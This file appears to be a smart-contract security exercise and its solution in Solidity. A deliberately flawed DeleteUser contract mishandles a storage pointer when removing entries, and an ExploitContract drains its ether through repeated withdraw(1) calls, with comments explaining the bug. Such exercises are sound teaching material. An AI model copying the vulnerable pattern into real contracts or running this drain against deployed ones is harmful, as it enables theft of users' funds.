// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */
 
contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] private users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
}

// add your exploiter contract here
contract ExploitContract {
    /**
     * local storage variables are just pointers referring to storage variable.
     * so setting "user = users[users.length - 1]" does not set the new value but change
     * pointer to point to the new location.
     * Thats why the expected result, swap and then pop, is not achieved. 
     */
    function exploit(DeleteUser deleteUser) public payable {
        // add entry on index 1
        deleteUser.deposit{value: msg.value}();
        // add dummy entry on index 2
        deleteUser.deposit{value: 0}();
        // pop last element i.e. with 0 value and receive 1 ether
        deleteUser.withdraw(1);
        // pop index 1 and receive 1 ether
        deleteUser.withdraw(1);
    }

    receive() external payable {

    } 
}